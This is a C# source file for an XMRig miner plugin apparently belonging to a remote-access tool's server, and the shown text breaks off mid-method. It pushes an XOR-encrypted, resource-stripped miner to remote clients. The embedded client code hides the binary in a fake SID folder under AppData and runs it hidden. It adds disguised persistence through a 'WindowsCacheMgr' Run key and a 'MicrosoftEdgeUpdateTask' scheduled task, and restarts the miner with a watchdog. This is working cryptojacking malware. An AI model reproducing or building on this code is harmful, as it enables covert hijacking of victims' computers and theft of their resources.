// File: Plugins/Builtin/MinerPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class MinerPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, MinerUI> _clientUIs = new();
        private readonly ConcurrentDictionary<string, bool> _clientKeepAlive = new();
        private readonly ConcurrentDictionary<string, string> _clientExeNames = new();
        private string _xmrigPath;

        public string PluginId => "miner";
        public string DisplayName => "XMRig Miner";
        public string Version => "1.1.0";
        public string Description => "Deploy XMRig miner with stealth execution, PPID spoofing, and watchdog.";

        private static readonly Random _rng = new();

        internal static byte[] StripPeInMemory(byte[] pe)
        {
            try
            {
                if (pe.Length < 0x40 || pe[0] != (byte)'M' || pe[1] != (byte)'Z') return pe;
                uint e_lfanew = (uint)(pe[0x3C] | (pe[0x3D] << 8) | (pe[0x3E] << 16) | (pe[0x3F] << 24));
                if (e_lfanew + 0x18 + 4 >= pe.Length) return pe;
                if (pe[e_lfanew] != (byte)'P' || pe[e_lfanew + 1] != (byte)'E') return pe;

                ushort machine = (ushort)(pe[e_lfanew + 4] | (pe[e_lfanew + 5] << 8));
                bool is64Bit = (machine == 0x8664);
                int optHdrOffset = (int)e_lfanew + 24;
                ushort magic = (ushort)(pe[optHdrOffset] | (pe[optHdrOffset + 1] << 8));
                if (magic != 0x10B && magic != 0x20B) return pe;

                int dataDirOffset = (magic == 0x20B) ? optHdrOffset + 112 : optHdrOffset + 96;
                if (dataDirOffset + 16 > pe.Length) return pe;

                int rsrcRva = BitConverter.ToInt32(pe, dataDirOffset + 2 * 8);
                int rsrcSize = BitConverter.ToInt32(pe, dataDirOffset + 2 * 8 + 4);
                if (rsrcRva == 0 || rsrcSize == 0) return pe;

                // Find section header for .rsrc
                int sectHdrOffset = (magic == 0x20B) ? optHdrOffset + 128 + 16 : optHdrOffset + 96 + 16;
                ushort numSections = (ushort)(pe[e_lfanew + 6] | (pe[e_lfanew + 7] << 8));
                int rvaDelta = 0;
                int rsrcOffset = -1;
                for (int i = 0; i < numSections; i++)
                {
                    int shOff = sectHdrOffset + i * 40;
                    if (shOff + 36 > pe.Length) break;
                    int sectVAddr = BitConverter.ToInt32(pe, shOff + 12);
                    int sectVSize = BitConverter.ToInt32(pe, shOff + 8);
                    int sectRaw = BitConverter.ToInt32(pe, shOff + 20);
                    if (sectVAddr <= rsrcRva && rsrcRva < sectVAddr + sectVSize)
                    {
                        rvaDelta = sectRaw - sectVAddr;
                        rsrcOffset = rsrcRva + rvaDelta;
                        break;
                    }
                }
                if (rsrcOffset < 0 || rsrcOffset >= pe.Length) return pe;

                WalkResourceDir(pe, rsrcOffset, rsrcOffset, 0, ref rvaDelta);
            }
            catch { }
            return pe;
        }

        private static void WalkResourceDir(byte[] pe, int baseOffset, int dirOffset, int depth, ref int rvaDelta)
        {
            if (dirOffset + 16 > pe.Length) return;
            int namedCount = (ushort)(pe[dirOffset + 12] | (pe[dirOffset + 13] << 8));
            int idCount = (ushort)(pe[dirOffset + 14] | (pe[dirOffset + 15] << 8));
            int total = namedCount + idCount;
            int entriesOff = dirOffset + 16;

            for (int i = 0; i < total; i++)
            {
                int eOff = entriesOff + i * 8;
                if (eOff + 8 > pe.Length) break;
                uint nameOrId = (uint)(pe[eOff] | (pe[eOff + 1] << 8) | (pe[eOff + 2] << 16) | (pe[eOff + 3] << 24));
                uint offsetToData = (uint)(pe[eOff + 4] | (pe[eOff + 5] << 8) | (pe[eOff + 6] << 16) | (pe[eOff + 7] << 24));

                bool isSubDir = (offsetToData & 0x80000000) != 0;
                int dataOff = (int)(offsetToData & 0x7FFFFFFF);

                if (depth == 0)
                {
                    // Type level — check if we care about this type
                    uint typeId = nameOrId;
                    if (typeId == 16 || typeId == 3 || typeId == 14)
                    {
                        if (isSubDir)
                            WalkResourceDir(pe, baseOffset, baseOffset + dataOff, depth + 1, ref rvaDelta);
                    }
                }
                else if (depth == 1)
                {
                    // Name/ID level
                    if (isSubDir)
                        WalkResourceDir(pe, baseOffset, baseOffset + dataOff, depth + 2, ref rvaDelta);
                }
                else if (depth >= 2)
                {
                    // Language level — should be leaf with IMAGE_RESOURCE_DATA_ENTRY
                    if (!isSubDir && dataOff + 8 <= pe.Length - baseOffset)
                    {
                        int dataEntryOff = baseOffset + dataOff;
                        // Zero out the Size field (at offset +4 within data entry)
                        if (dataEntryOff + 8 <= pe.Length)
                        {
                            pe[dataEntryOff + 4] = 0;
                            pe[dataEntryOff + 5] = 0;
                            pe[dataEntryOff + 6] = 0;
                            pe[dataEntryOff + 7] = 0;
                        }
                    }
                }
            }
        }

        public bool ShouldKeepAlive(string clientId)
        {
            return _clientKeepAlive.TryGetValue(clientId, out bool alive) && alive;
        }

        internal void SetKeepAlive(string clientId, bool alive)
        {
            if (alive)
                _clientKeepAlive[clientId] = true;
            else
                _clientKeepAlive.TryRemove(clientId, out _);
        }

        internal string GetClientExeName(string clientId)
        {
            _clientExeNames.TryGetValue(clientId, out string name);
            return name;
        }

        internal void SetClientExeName(string clientId, string exeName)
        {
            _clientExeNames[clientId] = exeName;
        }

        internal static string BuildMinerConfig(string pool, string wallet, string worker, int cpuPct, bool idleOnly)
        {
            var cfg = new JObject
            {
                ["api"] = new JObject { ["id"] = null, ["worker_id"] = worker },
                ["http"] = new JObject { ["enabled"] = false, ["host"] = "127.0.0.1", ["port"] = 0 },
                ["autosave"] = true,
                ["background"] = true,
                ["colors"] = false,
                ["randomx"] = new JObject { ["mode"] = "auto", ["1gb_pages"] = false },
                ["cpu"] = new JObject { ["enabled"] = true, ["max_threads_hint"] = cpuPct, ["yield"] = true, ["priority"] = 0 },
                ["pools"] = new JArray
                {
                    new JObject
                    {
                        ["url"] = pool, ["user"] = wallet, ["pass"] = worker,
                        ["algo"] = null, ["nicehash"] = false, ["keepalive"] = false,
                        ["enabled"] = true, ["tls"] = false
                    }
                },
                ["print_time"] = 0,
                ["quiet"] = true
            };
            return cfg.ToString(Formatting.Indented);
        }

        internal async Task SendChunkedToClient(PluginContext context, byte cmd, byte[] data)
        {
            const int CHUNK_SIZE = 32768;
            int remaining = data.Length;
            int sent = 0;
            bool first = true;
            while (remaining > 0)
            {
                int chunkLen = Math.Min(remaining, CHUNK_SIZE);
                byte[] packet;
                if (first)
                {
                    packet = new byte[5 + chunkLen];
                    packet[0] = cmd;
                    packet[1] = (byte)(data.Length & 0xFF);
                    packet[2] = (byte)((data.Length >> 8) & 0xFF);
                    packet[3] = (byte)((data.Length >> 16) & 0xFF);
                    packet[4] = (byte)((data.Length >> 24) & 0xFF);
                    Buffer.BlockCopy(data, sent, packet, 5, chunkLen);
                    first = false;
                }
                else
                {
                    packet = new byte[1 + chunkLen];
                    packet[0] = 0x22;
                    Buffer.BlockCopy(data, sent, packet, 1, chunkLen);
                }
                await context.SendToClient(packet);
                sent += chunkLen;
                remaining -= chunkLen;
                if (remaining > 0) await Task.Delay(3);
            }
        }

        public async Task<bool> DeployAndStartForClient(string clientId, string pool, string wallet, string worker, int cpuPct, bool autoStart)
        {
            var context = await _host.StartPluginForClient(clientId, PluginId);
            if (context == null) return false;

            if (!await EnsureXmrigDownloaded()) return false;

            byte[] binary = StripPeInMemory(File.ReadAllBytes(_xmrigPath));
            byte[] encrypted = XorEncrypt(binary);
            string configJson = BuildMinerConfig(pool, wallet, worker, cpuPct, false);

            await SendChunkedToClient(context, 0x21, Encoding.UTF8.GetBytes(configJson));
            await SendChunkedToClient(context, 0x20, encrypted);

            byte[] sp = new byte[2];
            sp[0] = 0x11;
            sp[1] = (byte)(autoStart ? 1 : 0);
            await context.SendToClient(sp);

            int threadCount = cpuPct > 50 ? 0 : Math.Max(1, Environment.ProcessorCount * cpuPct / 100);
            byte[] tp = new byte[2];
            tp[0] = 0x12;
            tp[1] = (byte)threadCount;
            await context.SendToClient(tp);

            await context.SendToClient(new byte[] { 0x30 });
            SetKeepAlive(clientId, true);
            return true;
        }

        public static byte[] XorEncrypt(byte[] data)
        {
            byte key = (byte)_rng.Next(1, 256);
            byte[] result = new byte[data.Length + 1];
            result[0] = key;
            for (int i = 0; i < data.Length; i++)
                result[i + 1] = (byte)(data[i] ^ key);
            return result;
        }

        public Task Initialize(PluginHost host)
        {
            _host = host;
            _xmrigPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "xmrig.exe");
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
            _clientKeepAlive.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_miner
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts;
        private Process _minerProc;
        private Thread _watchdog;
        private volatile bool _running;
        private string _workDir;
        private string _exePath;
        private string _configContent;
        private bool _startOnBoot;
        private int _threadCount = 0;
        private Random _rnd = new Random();

        MemoryStream _chunkStream;
        int _chunkExpectedLen;
        int _chunkMode;
        const int CHUNK_MODE_EXE = 1;
        const int CHUNK_MODE_CONFIG = 2;

        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetCurrentProcess();

        async Task Log(string msg)
        {
            try
            {
                byte[] b = Encoding.UTF8.GetBytes(""[M] "" + msg);
                byte[] m = new byte[b.Length + 1];
                m[0] = 0xFD;
                Buffer.BlockCopy(b, 0, m, 1, b.Length);
                await _send(m);
            }
            catch { }
        }

        async Task SendAck(byte cmd, string msg)
        {
            try
            {
                byte[] mb = Encoding.UTF8.GetBytes(msg);
                byte[] packet = new byte[mb.Length + 2];
                packet[0] = 0xFE;
                packet[1] = cmd;
                Buffer.BlockCopy(mb, 0, packet, 2, mb.Length);
                await _send(packet);
            }
            catch { }
        }

        Process StartMinerProcess(string exe, string args, string dir)
        {
            var psi = new ProcessStartInfo
            {
                FileName = exe,
                Arguments = args,
                WorkingDirectory = dir,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            return Process.Start(psi);
        }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            _cts = new CancellationTokenSource();
            await Log(""XMRig Miner plugin ready"");
            await SendAck(0x01, ""Ready"");

            while (!_cts.IsCancellationRequested)
            {
                byte[] data = null;
                bool fail = false;
                try { data = await receiveData(); }
                catch { fail = true; }
                if (fail || data == null || data.Length == 0) break;

                try { await HandleCmd(data); }
                catch (Exception ex) { Log(""Error: "" + ex.Message).Wait(1000); }
            }

            StopMiner();
            _cts.Cancel();
        }

        async Task HandleCmd(byte[] data)
        {
            byte cmd = data[0];
            switch (cmd)
            {
                case 0x10:
                    _configContent = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                    await Log(""Config received: "" + _configContent.Length + "" chars"");
                    await SendAck(0x10, ""Config loaded"");
                    break;

                case 0x11:
                    _startOnBoot = data[1] == 1;
                    await Log(""Auto-start: "" + _startOnBoot);
                    await SendAck(0x11, ""Startup set"");
                    break;

                case 0x12:
                    _threadCount = data[1];
                    await Log(""Threads: "" + _threadCount);
                    await SendAck(0x12, ""Thread count set"");
                    break;

                case 0x20:
                case 0x21:
                    if (data.Length > 5)
                    {
                        _chunkExpectedLen = data[1] | (data[2] << 8) | (data[3] << 16) | (data[4] << 24);
                        _chunkMode = (cmd == 0x20) ? CHUNK_MODE_EXE : CHUNK_MODE_CONFIG;
                        if (_chunkStream != null) _chunkStream.Dispose();
                        _chunkStream = new MemoryStream(_chunkExpectedLen);
                        _chunkStream.Write(data, 5, data.Length - 5);
                        if (_chunkStream.Length >= _chunkExpectedLen)
                            await FinalizeChunk();
                    }
                    break;

                case 0x22:
                    if (_chunkStream != null && data.Length > 1)
                    {
                        _chunkStream.Write(data, 1, data.Length - 1);
                        if (_chunkStream.Length >= _chunkExpectedLen)
                            await FinalizeChunk();
                    }
                    break;

                case 0x30:
                    StartMiner();
                    break;

                case 0x31:
                    StopMiner();
                    await SendAck(0x31, ""Stopped"");
                    break;

                case 0x32:
                    if (_running)
                    {
                        await Log(""Miner running (PID="" + (_minerProc != null ? _minerProc.Id.ToString() : ""?"") + "")"");
                        await SendAck(0x32, ""Running"");
                    }
                    else
                    {
                        await Log(""Miner stopped"");
                        await SendAck(0x32, ""Stopped"");
                    }
                    break;
            }
        }

        async Task FinalizeChunk()
        {
            byte[] assembled = _chunkStream.ToArray();
            _chunkStream.Dispose();
            _chunkStream = null;

            if (_chunkMode == CHUNK_MODE_EXE)
            {
                byte key = assembled[0];
                byte[] decrypted = new byte[assembled.Length - 1];
                for (int i = 0; i < decrypted.Length; i++)
                    decrypted[i] = (byte)(assembled[i + 1] ^ key);

                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string baseDir = Path.Combine(appData, ""Microsoft"", ""Crypto"", ""RSA"");
                string sidDir;
                int attempts = 0;
                do
                {
                    sidDir = ""S-1-5-21-"" + _rnd.Next(100000000, 999999999) + ""-"" + _rnd.Next(100000000, 999999999) + ""-"" + _rnd.Next(10000000, 99999999);
                    string fullDir = Path.Combine(baseDir, sidDir);
                    if (!Directory.Exists(fullDir) && attempts < 10)
                    {
                        Directory.CreateDirectory(fullDir);
                        new DirectoryInfo(fullDir).Attributes = FileAttributes.Hidden | FileAttributes.System;
                        _workDir = fullDir;
                        break;
                    }
                    attempts++;
                }
                while (attempts < 10);

                if (_workDir == null)
                {
                    _workDir = Path.Combine(Path.GetTempPath(), ""."" + ""tmp"" + _rnd.Next(1000, 9999));
                    Directory.CreateDirectory(_workDir);
                }

                string rndName = """";
                string chars = ""abcdefghijklmnopqrstuvwxyz"";
                for (int i = 0; i < 6; i++)
                    rndName += chars[_rnd.Next(chars.Length)];
                rndName += "".exe"";

                _exePath = Path.Combine(_workDir, rndName);
                File.WriteAllBytes(_exePath, decrypted);
                try { File.SetAttributes(_exePath, FileAttributes.Hidden); } catch { }

                await Log(""Binary deployed: "" + rndName + "" ("" + decrypted.Length + "" bytes)"");
                await SendAck(0x20, ""Binary OK ["" + rndName.Replace("".exe"", """") + ""] ("" + decrypted.Length + "" bytes)"");
            }
            else
            {
                _configContent = Encoding.UTF8.GetString(assembled);
                await Log(""Config assembled: "" + _configContent.Length + "" chars"");
                await SendAck(0x21, ""Config assembled"");
            }
        }

        void AddPersistence()
        {
            if (!_startOnBoot) return;
            try
            {
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true))
                {
                    if (key != null)
                        key.SetValue(""WindowsCacheMgr"", ""\"""" + _exePath + ""\"" --config config.json --no-color --quiet --background"");
                }
            }
            catch { }

            try
            {
                string taskName = ""MicrosoftEdgeUpdateTask"" + _rnd.Next(1000, 9999);
                string psCmd = ""schtasks /Create /TN \"""" + taskName + ""\"" /TR \"""" + _exePath + "" --config config.json --no-color --quiet --background\"" /SC ONLOGON /RL HIGHEST /F"";
                var psi = new ProcessStartInfo
                {
                    FileName = ""cmd.exe"",
                    Arguments = ""/c "" + psCmd,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi);
            }
            catch { }
        }

        void RemovePersistence()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true))
                {
                    if (key != null)
                        key.DeleteValue(""WindowsCacheMgr"", false);
                }
            }
            catch { }
        }

        void StartMiner()
        {
            if (_running)
            {
                Log(""Miner already running"").Wait(1000);
                return;
            }
            if (string.IsNullOrEmpty(_exePath) || !File.Exists(_exePath))
            {
                Log(""No binary deployed"").Wait(1000);
                return;
            }
            if (string.IsNullOrEmpty(_configContent))
            {
                Log(""No config received"").Wait(1000);
                return;
            }

            try
            {
                string configPath = Path.Combine(_workDir, ""config.json"");
                File.WriteAllText(configPath, _configContent);
                try { File.SetAttributes(configPath, FileAttributes.Hidden); } catch { }

                string args = ""--config config.json --no-color --quiet --background"";
                string dir = _workDir;

                _minerProc = StartMinerProcess(_exePath, args, dir);

                if (_minerProc != null)
                {
                    try { _minerProc.PriorityClass = ProcessPriorityClass.Idle; } catch { }
                    AddPersistence();
                    _running = true;
                    _watchdog = new Thread(WatchdogLoop);
                    _watchdog.IsBackground = true;
                    _watchdog.Start();
                    Log(""Miner started (PID="" + _minerProc.Id + "")"").Wait(1000);
                }
            }
            catch (Exception ex)
            {
                Log(""Start failed: "" + ex.Message).Wait(1000);
            }
        }

        void WatchdogLoop()
        {
            while (_running)
            {
                int delay = _rnd.Next(7000, 15001);
                Thread.Sleep(delay);

                if (!_running) break;

                try
                {
                    if (_minerProc == null || _minerProc.HasExited)
                    {
                        Log(""Watchdog restarting miner..."").Wait(1000);
                        string args = ""--config config.json --no-color --quiet --background"";
                        _minerProc = StartMinerProcess(_exePath, args, _workDir);

                        if (_minerProc != null)
                        {
                            try { _minerProc.PriorityClass = ProcessPriorityClass.Idle; } catch { }
                            Log(""Watchdog restarted (PID="" + _minerProc.Id + "")"").Wait(1000);
                        }
                    }
                }
                catch { }
            }
        }

        void StopMiner()
        {
            _running = false;
            RemovePersistence();
            try
            {
                if (_minerProc != null && !_minerProc.HasExited)
                {
                    _minerProc.Kill();
                    _minerProc.WaitForExit(5000);
                }
            }
            catch { }
            _minerProc = null;

            try
            {
                if (_workDir != null && Directory.Exists(_workDir))
                    Directory.Delete(_workDir, true);
            }
            catch { }
            _workDir = null;
            _exePath = null;
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            bool isActive = _host.IsPluginActive(context.ClientId, PluginId);
            if (!isActive)
            {
                _ = Task.Run(async () =>
                {
                    try { await _host.StartPluginForClient(context.ClientId, PluginId); }
                    catch { }
                });
            }
            var ui = new MinerUI(context, _host, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            if (_clientUIs.TryGetValue(clientId, out var ui))
                ui.HandleServerData(data);
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui)) ui.Dispose();
            _clientKeepAlive.TryRemove(clientId, out _);
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
        }

        internal async Task<bool> EnsureXmrigDownloaded()
        {
            if (File.Exists(_xmrigPath))
                return true;
            try
            {
                string url = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip";
                string zipPath = Path.Combine(Path.GetTempPath(), "xrd_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".tmp");
                using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(60) })
                {
                    var resp = await client.GetAsync(url);
                    resp.EnsureSuccessStatusCode();
                    using (var fs = new FileStream(zipPath, FileMode.Create, FileAccess.Write))
                        await resp.Content.CopyToAsync(fs);
                }
                string extractDir = Path.Combine(Path.GetTempPath(), "xex_" + Guid.NewGuid().ToString("N").Substring(0, 8));
                ZipFile.ExtractToDirectory(zipPath, extractDir);
                string extracted = Directory.GetFiles(extractDir, "xmrig.exe", SearchOption.AllDirectories).FirstOrDefault();
                if (extracted != null)
                    File.Copy(extracted, _xmrigPath, true);
                try { Directory.Delete(extractDir, true); } catch { }
                try { File.Delete(zipPath); } catch { }
                return File.Exists(_xmrigPath);
            }
            catch { return false; }
        }

        internal string XmrigPath => _xmrigPath;
    }

    [SupportedOSPlatform("windows")]
    public class MinerUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private readonly PluginContext _context;
        private readonly PluginHost _host;
        private readonly MinerPlugin _plugin;

        Color BgCol => C("BackgroundColor");
        Color SurfCol => C("SurfaceColor");
        Color SurfLCol => C("SurfaceLightColor");
        Color BrdCol => C("BorderColor");
        Color TxtCol => C("TextPrimaryColor");
        Color DimCol => C("TextSecondaryColor");
        Color DanCol => C("DangerColor");
        Color DanHov => C("DangerHoverColor");
        Color OkCol => C("SuccessColor");
        Color OkHov => C("SuccessHoverColor");
        Color WarnCol => C("WarningColor");
        Color WarnHov => C("WarningColor");
        Color AccCol => C("PrimaryColor");
        Color AccHov => C("PrimaryHoverColor");

        SolidColorBrush BgB => B("BackgroundBrush");
        SolidColorBrush SfB => B("SurfaceBrush");
        SolidColorBrush TxB => B("TextPrimaryBrush");
        SolidColorBrush DmB => B("TextSecondaryBrush");
        SolidColorBrush BdB => B("BorderBrush");

        private readonly TextBox _poolBox;
        private readonly TextBox _walletBox;
        private readonly TextBox _workerBox;
        private readonly Slider _cpuSlider;
        private readonly TextBlock _cpuLabel;
        private readonly CheckBox _autoStartChk;
        private readonly CheckBox _idleMiningChk;

        private readonly TextBox _logBox;
        private readonly Button _buildBtn;
        private readonly Button _startBtn;
        private readonly Button _stopBtn;
        private readonly ProgressBar _progress;
        private readonly TextBlock _statusText;

        private byte[] _xmrigBinary;
        private bool _binaryReady;
        private bool _disposed;
        private bool _busy;

        private const int CHUNK_SIZE = 32768;

        public MinerUI(PluginContext ctx, PluginHost host, MinerPlugin plugin)
        {
            _context = ctx;
            _host = host;
            _plugin = plugin;

            var root = new Grid();
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var hdr = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(8) };
            hdr.Child = new TextBlock { Text = "XMRig Miner — Stealth Deployment", FontSize = 14, FontWeight = FontWeights.SemiBold, Foreground = TxB };
            Grid.SetRow(hdr, 0);
            root.Children.Add(hdr);

            var cg = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(8) };
            var cfg = new Grid();
            cfg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            cfg.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            cfg.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            int row = 0;

            AddRow(cfg, row++, "Pool:", _poolBox = new TextBox { Text = "pool.supportxmr.com:3333", Foreground = TxB, Background = BgB, BorderBrush = BdB, BorderThickness = new Thickness(1), Padding = new Thickness(6, 3, 6, 3), FontSize = 12 });
            AddRow(cfg, row++, "Wallet:", _walletBox = new TextBox { Text = "", Foreground = TxB, Background = BgB, BorderBrush = BdB, BorderThickness = new Thickness(1), Padding = new Thickness(6, 3, 6, 3), FontSize = 12, Height = 60, TextWrapping = TextWrapping.Wrap, VerticalScrollBarVisibility = ScrollBarVisibility.Auto, AcceptsReturn = true });
            AddRow(cfg, row++, "Worker:", _workerBox = new TextBox { Text = Environment.MachineName, Foreground = TxB, Background = BgB, BorderBrush = BdB, BorderThickness = new Thickness(1), Padding = new Thickness(6, 3, 6, 3), FontSize = 12 });

            var cp = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(4) };
            cp.Children.Add(new TextBlock { Text = "CPU Usage:", Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center });
            _cpuSlider = new Slider { Width = 120, Minimum = 1, Maximum = 100, Value = 50, TickFrequency = 5, IsSnapToTickEnabled = true, Margin = new Thickness(8, 0, 4, 0), VerticalAlignment = VerticalAlignment.Center };
            _cpuLabel = new TextBlock { Text = "50%", Foreground = TxB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, MinWidth = 40 };
            _cpuSlider.ValueChanged += (s, e) => _cpuLabel.Text = (int)_cpuSlider.Value + "%";
            cp.Children.Add(_cpuSlider);
            cp.Children.Add(_cpuLabel);
            Grid.SetRow(cp, row); Grid.SetColumnSpan(cp, 2);
            cfg.Children.Add(cp);
            row++;

            _autoStartChk = new CheckBox { Content = "Auto-start on boot", Foreground = DmB, FontSize = 12, Margin = new Thickness(4, 4, 4, 2), IsChecked = false };
            Grid.SetRow(_autoStartChk, row); Grid.SetColumnSpan(_autoStartChk, 2);
            cfg.Children.Add(_autoStartChk);
            row++;

            _idleMiningChk = new CheckBox { Content = "Idle mining only (pauses when user active)", Foreground = DmB, FontSize = 12, Margin = new Thickness(4, 4, 4, 2), IsChecked = false };
            Grid.SetRow(_idleMiningChk, row); Grid.SetColumnSpan(_idleMiningChk, 2);
            cfg.Children.Add(_idleMiningChk);
            row++;



            cg.Child = cfg;
            Grid.SetRow(cg, 1);
            root.Children.Add(cg);

            var bb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(8, 6, 8, 6) };
            var bp = new StackPanel { Orientation = Orientation.Horizontal };
            _buildBtn = MakeBtn("Build & Send", OkCol, OkHov, Brushes.White);
            _buildBtn.Click += async (s, e) => await BuildAndSend();
            _startBtn = MakeBtn("Start", AccCol, AccHov, Brushes.White);
            _startBtn.Click += async (s, e) => await SendCmd(0x30, "Start command sent.");
            _startBtn.IsEnabled = false;
            _stopBtn = MakeBtn("Stop", DanCol, DanHov, Brushes.White);
            _stopBtn.Click += async (s, e) => await SendCmd(0x31, "Stop command sent.");
            _stopBtn.IsEnabled = false;
            _statusText = new TextBlock { Text = "Ready", Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 0, 0, 0) };
            bp.Children.Add(_buildBtn);
            bp.Children.Add(_startBtn);
            bp.Children.Add(_stopBtn);
            bp.Children.Add(_statusText);
            bb.Child = bp;
            Grid.SetRow(bb, 2);
            root.Children.Add(bb);

            _progress = new ProgressBar { Height = 4, Minimum = 0, Maximum = 100, Value = 0, Visibility = Visibility.Collapsed, Foreground = B("PrimaryBrush") };
            Grid.SetRow(_progress, 3);
            root.Children.Add(_progress);

            var lb = new Border { Background = BgB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 0) };
            _logBox = new TextBox
            {
                Background = BgB, Foreground = new SolidColorBrush(Color.FromRgb(100, 220, 100)),
                BorderThickness = new Thickness(0), FontFamily = new FontFamily("Consolas"),
                FontSize = 11, IsReadOnly = true, TextWrapping = TextWrapping.Wrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto, Padding = new Thickness(4),
                CaretBrush = Brushes.Transparent, AcceptsReturn = true, Style = null
            };
            lb.Child = _logBox;
            Grid.SetRow(lb, 4);
            root.Children.Add(lb);

            var sb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 1, 0, 0), Padding = new Thickness(10, 5, 10, 5) };
            sb.Child = new TextBlock { Text = "Configure pool & wallet, then click Build & Send", Foreground = DmB, FontSize = 12 };
            Grid.SetRow(sb, 5);
            root.Children.Add(sb);

            Content = root;
            Background = BgB;

            _ = CheckBinary();
        }

        void AddRow(Grid g, int r, string label, Control ctrl)
        {
            g.Children.Add(new TextBlock { Text = label, Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4) });
            Grid.SetRow(g.Children[g.Children.Count - 1], r); Grid.SetColumn(g.Children[g.Children.Count - 1], 0);
            Grid.SetRow(ctrl, r); Grid.SetColumn(ctrl, 1);
            g.Children.Add(ctrl);
        }

        async Task CheckBinary()
        {
            string p = _plugin.XmrigPath;
            if (File.Exists(p))
            {
                _xmrigBinary = MinerPlugin.StripPeInMemory(File.ReadAllBytes(p));
                _binaryReady = true;
                Log("XMRig ready: " + FormatSize(_xmrigBinary.Length));
            }
            else
                Log("No XMRig binary. Click Build to download v6.26.0.");
        }

        async Task BuildAndSend()
        {
            if (_busy) return;
            string wallet = _walletBox.Text.Trim();
            if (string.IsNullOrEmpty(wallet))
            {
                Log("Enter a wallet address first.");
                return;
            }

            _busy = true;
            _buildBtn.IsEnabled = false;
            _statusText.Text = "Building...";
            _progress.Visibility = Visibility.Visible;
            _progress.Value = 0;

            try
            {
                if (!_binaryReady)
                {
                    Log("Downloading XMRig v6.26.0...");
                    _progress.Value = 10;
                    bool ok = await _plugin.EnsureXmrigDownloaded();
                    if (!ok)
                    {
                        Log("Download failed. Place xmrig.exe in app folder manually.");
                        return;
                    }
                    _xmrigBinary = MinerPlugin.StripPeInMemory(File.ReadAllBytes(_plugin.XmrigPath));
                    _binaryReady = true;
                    Log("Downloaded: " + FormatSize(_xmrigBinary.Length));
                }
                _progress.Value = 30;

